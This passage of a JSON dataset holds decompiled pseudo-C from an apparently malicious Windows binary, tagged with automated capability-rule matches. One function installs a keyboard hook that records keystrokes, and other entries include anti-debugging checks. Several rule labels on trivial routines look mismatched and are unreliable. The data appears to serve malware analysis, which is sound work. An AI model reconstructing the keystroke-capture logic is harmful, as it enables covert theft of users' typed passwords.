fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_18h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_1ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&stack0xffffffdc);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&stack0xffffffd8);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        **0x495908 = iVar4;\n        *(**0x495908 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00488ad4();\n        fcn.00409ee4();\n        fcn.00488ad8();\n        fcn.00488aec();\n        fcn.00409ee4();\n        fcn.00488b38();\n        fcn.00488c1c();\n        fcn.00488b4c();\n        fcn.00488bb4();\n        fcn.00488c84();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff878);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x495908 == 0,  !uVar11)) {\n        cVar1 = fcn.00488cec();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041fec4();\n        }\n    }\n    puVar9 = &stack0xfffff874;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.00476010::var_10h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        **0x495840 = iVar4;\n        *(**0x495840 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00488644();\n        fcn.00409ee4();\n        fcn.00488640();\n        fcn.00409ee4();\n        fcn.0048863c();\n        fcn.0041fe9c();\n    }\n    fcn.00405974(puVar9);\n    if ((uVar11) && (uVar11 = **0x495840 == 0,  !uVar11)) {\n        cVar1 = fcn.00488658();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041fec4();\n        }\n    }\n    puVar9 = &stack0xfffff870;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.00476010::var_10h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00480070();\n        fcn.00409ee4();\n        fcn.00480074();\n        fcn.00409ee4();\n        fcn.00480078();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff86c, puVar9);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00474660();\n        fcn.00475f44(puVar12);\n    }\n    puVar9 = &stack0xfffff864;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.00476010::var_14h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        **0x495c64 = iVar4;\n        *(**0x495c64 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00486b48();\n        fcn.00409ee4();\n        fcn.00486b44();\n        fcn.00409ee4();\n        fcn.00486b40();\n        fcn.00409ee4();\n        fcn.00486b3c();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff860, puVar9);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x495c64 == 0,  !uVar11)) {\n        cVar1 = fcn.00486b4c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.0041fec4();\n        }\n    }\n    puVar12 = &stack0xfffff85c;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        piStack2368 = &fcn.00476010::var_10h;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puVar12 = &stack0xfffff858;\n        fcn.00405a44(puVar12);\n        fcn.00405974();\n        if (uVar11) {\n            fcn.004055c8();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar11) {\n                if (**0x495b20 != NULL) {\n                    piVar8 = fcn.004059dc(**0x495b34);\n                    uVar3 = fcn.00409ee4(**0x4959d8);\n                    (***0x495b20)(uVar3);\n                    *in_FS_OFFSET = piVar8;\n                    goto code_r0x0047d309;\n                }\n            }\n            else {\n                fcn.00405974();\n                if ((uVar11) && (**0x495bf8 != 0)) {\n                    uVar3 = fcn.004059dc();\n                    piVar8 = **0x495af4;\n                    (***0x495978)(piVar8, uVar3);\n                    *in_FS_OFFSET = piVar8;\n                    goto code_r0x0047d309;\n                }\n            }\n        }\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.0047fca8();\n        fcn.0047fcac();\n        fcn.0047fc58();\n        uVar11 = 1;\n        fcn.0047fca4();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff854, puVar12);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        uVar11 = **0x495bf8 == 0;\n        if ((!uVar11) && (uVar11 = **0x495c88 == NULL,  !uVar11)) {\n            uVar3 = fcn.004059dc();\n            (***0x495c88)(uVar3);\n        }\n    }\n    fcn.00405974();\n    if (((uVar11) && (uVar11 = **0x495bf8 == 0,  !uVar11)) && (uVar11 = **0x495c58 == NULL,  !uVar11)) {\n        (***0x495c58)();\n    }\n    fcn.00405974();\n    if (((uVar11) && (uVar11 = **0x495bf8 == 0,  !uVar11)) && (uVar11 = **0x495c58 == NULL,  !uVar11)) {\n        (***0x495ca4)();\n    }\n    piVar8 = &fcn.00476010::var_7ach;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        **0x49585c = iVar4;\n        *(**0x49585c + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00486048();\n        fcn.0041fe9c();\n    }\n    *in_FS_OFFSET = piVar8;\ncode_r0x0047d309:\n    *in_FS_OFFSET = piStack2368;\n    fcn.00405554(0x47d44c);\n    fcn.0040700c();\n    fcn.00405554();\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405554();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.004060f8();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.004060ac();\n    fcn.00411658();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 48788
    },
    "00481bc8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481bc8(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack284 = 0x482056;\n    piStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack288;\n    uStack296 = 0x48201d;\n    piStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack300;\n    if ((arg_8h < 0) || (puVar1 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  arg_8h == 3)) {\n        sub.user32.dll_CallNextHookEx(*0x49b1c0, arg_8h, arg_ch, arg_10h);\n        puVar1 = puStack292;\n        puVar2 = puStack280;\n    }\n    puStack280 = puVar2;\n    puStack292 = puVar1;\n    if ((arg_8h != 0) || ((arg_ch != 0x100 && (arg_ch != 0x104)))) goto code_r0x00481ffa;\n    cVar3 = fcn.00481bb0();\n    if (cVar3 != '\\0') {\n        sub.user32.dll_CallNextHookEx(*0x49b1c0, 0, arg_ch, arg_10h);\n    }\n    iVar4 = *arg_10h;\n    if (iVar4 < 0x2f) {\n        if (iVar4 == 0x2e) {\n            fcn.004055c8();\n            goto code_r0x00481fe0;\n        }\n        if (iVar4 - 8U < 0x26) {\n    // switch table (38 cases) at 0x481c85\n            switch(*((iVar4 - 8U) * 4 + 0x481c85)) {\n            case 0x481db4:\n                fcn.004055c8();\n                break;\n            case 0x481dc6:\n                fcn.004055c8();\n                break;\n            case 0x481dd8:\n                fcn.004055c8();\n                break;\n            case 0x481dea:\n                fcn.004055c8();\n                break;\n            case 0x481eb0:\n                fcn.004055c8();\n                break;\n            case 0x481ec2:\n                fcn.004055c8();\n                break;\n            case 0x481ed4:\n                fcn.004055c8();\n                break;\n            case 0x481ee6:\n                fcn.004055c8();\n                break;\n            case 0x481ef8:\n                fcn.004055c8();\n                break;\n            case 0x481f0a:\n                fcn.004055c8();\n                break;\n            default:\n                goto code_r0x00481f1c;\n            }\n            goto code_r0x00481fe0;\n        }\ncode_r0x00481f1c:\n        sub.user32.dll_GetKeyState(0x14);\n        sub.user32.dll_GetKeyState(0x11);\n        sub.user32.dll_GetKeyState(0xa0);\n        sub.user32.dll_GetKeyState();\n        if (cVar3 == '\\0') {\n            sub.user32.dll_GetKeyboardState();\n            iVar4 = fcn.0040f318();\n            if (iVar4 != 0) {\n                fcn.00405c6c();\n                uVar5 = fcn.00405a3c(0);\n                sub.user32.dll_MapVirtualKeyA(*arg_10h, 0, &var_104h, uVar5);\n                iVar4 = sub.user32.dll_ToAscii();\n                if (iVar4 == 0) {\n                    fcn.00405530();\n                }\n                else if (iVar4 == 1) {\n                    fcn.00405c6c();\n                }\n                else if (iVar4 != 2) {\n                    fcn.00405530();\n                }\n            }\n        }\n    }\n    else {\n        if (0x20 < iVar4 - 0x70U) goto code_r0x00481f1c;\n    // switch table (33 cases) at 0x481d30\n        switch(*((iVar4 - 0x70U) * 4 + 0x481d30)) {\n        case 0x481dfc:\n            fcn.004055c8();\n            break;\n        case 0x481e0e:\n            fcn.004055c8();\n            break;\n        case 0x481e20:\n            fcn.004055c8();\n            break;\n        case 0x481e32:\n            fcn.004055c8();\n            break;\n        case 0x481e44:\n            fcn.004055c8();\n            break;\n        case 0x481e56:\n            fcn.004055c8();\n            break;\n        case 0x481e68:\n            fcn.004055c8();\n            break;\n        case 0x481e7a:\n            fcn.004055c8();\n            break;\n        case 0x481e8c:\n            fcn.004055c8();\n            break;\n        default:\n            goto code_r0x00481f1c;\n        }\n    }\ncode_r0x00481fe0:\n    fcn.004815e8();\n    if (**0x495a88 == 1) {\n        fcn.00481a50();\n    }\ncode_r0x00481ffa:\n    piVar6 = *0x49b1c0;\n    sub.user32.dll_CallNextHookEx(*0x49b1c0, arg_8h, arg_ch);\n    *in_FS_OFFSET = piVar6;\n    *in_FS_OFFSET = arg_10h;\n    fcn.00405530(0x48205d);\n    return;\n}\n",
        "token_count": 1447
    },
    "00489420": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00489420(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint8_t uStack8;\n    \n    puStack196 = &stack0xfffffffc;\n    uStack200 = 0x4894ec;\n    uStack204 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack204;\n    fcn.00405584();\n    while( true ) {\n        uVar2 = 1;\n        uStack204 = 0;\n        iVar1 = sub.user32.dll_EnumDisplayDevicesA();\n        if (iVar1 == 0) break;\n        if ((uStack8 & 1) != 0) {\n            fcn.004057a0(*in_EAX);\n            fcn.004057a0(0x489528, 0);\n            uStack204 = 0x489540;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = uStack204;\n    fcn.00405554(0x4894f3, uVar2);\n    return;\n}\n",
        "token_count": 287
    },
    "0048d414": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0048d414(void)\n\n{\n    uint8_t uStack23;\n    uchar auStack20 [12];\n    \n    sub.kernel32.dll_GetSystemPowerStatus();\n    uStack23 = auStack20 >> 8;\n    if ((uStack23 & 1) == 1) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 2) == 2) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 4) == 4) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 8) == 8) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 0x80) == 0x80) {\n        fcn.00405584();\n    }\n    if (uStack23 == 0xff) {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "004015d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015d0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 143
    },
    "004016f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016f8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.0040168c();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x13fff0, 0x1000, 4);\n    puVar1 = *0x49670c;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x496708;\n        puVar2 = puVar3;\n        puVar3[1] = *0x49670c;\n        *0x49670c = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4fffb] = 2;\n        *0x496720 = 0x13ffe0 - in_EAX;\n        *0x49671c = puVar3 + (0x13fff0 - in_EAX);\n        iVar4 = *0x49671c;\n        *(*0x49671c + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x496720 = 0;\n    return 0;\n}\n",
        "token_count": 280
    },
    "004022d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004022d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00402334": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402334(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 176
    },
    "00403420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nfloat10 fcn.00403420(float10 param_1)\n\n{\n    return param_1 - ROUND(param_1);\n}\n",
        "token_count": 28
    },
    "0040580c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040580c(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040646c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040646c(void)\n\n{\n    fcn.00405d8c();\n    return 0;\n}\n",
        "token_count": 28
    },
    "0040679c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040679c(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00403050();\n        }\n        fcn.00406794();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00403050();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.0040678c();\n            }\n            fcn.00402f34();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402f00();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004030fc();\n            }\n            else {\n                fcn.00403af4();\n                fcn.0040677c(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403af4();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.0040679c(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 634
    },
    "0040738c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004073d8)\n\nvoid fcn.0040738c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x407438;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00405530();\n    bVar3 = true;\n    arg_8h = 0x4073bd;\n    fcn.00405ed4();\n    if (!bVar3) {\n        fcn.00405ec8();\n        fcn.00405c6c();\n        arg_8h = fcn.00405ec8();\n        uVar1 = fcn.00405eb8();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00407180(arg_8h);\n        if (iVar2 < 1) {\n            fcn.00405530();\n        }\n        else {\n            fcn.00405c6c();\n        }\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x40743f;\n    uStack32 = 0x407437;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "00407448": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00407448(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4074f3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x407470;\n    fcn.00405d28();\n    if (in_EAX != 0) {\n        fcn.00405fa4();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.00405ec8();\n        uVar1 = fcn.004059dc(iVar2 + 1);\n        fcn.00405eb8(uVar1);\n        iVar2 = fcn.0040725c(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405d28();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.00405fa4();\n            iVar2 = in_EAX;\n        }\n        fcn.00405d64();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x4074fa;\n    iStack36 = 0x4074f2;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 359
    },
    "004097e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004097e4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 - piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 - piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 484
    },
    "0040986c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040986c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 + piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 + piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 492
    },
    "00409ab0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ab0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409ae8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ae8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409b20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409b20(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2);\n    uVar1 = fcn.004059dc(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00409b84": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b84(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.00405530();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.00405a44(param_2);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00409c28": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c28(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 125
    },
    "00409c60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
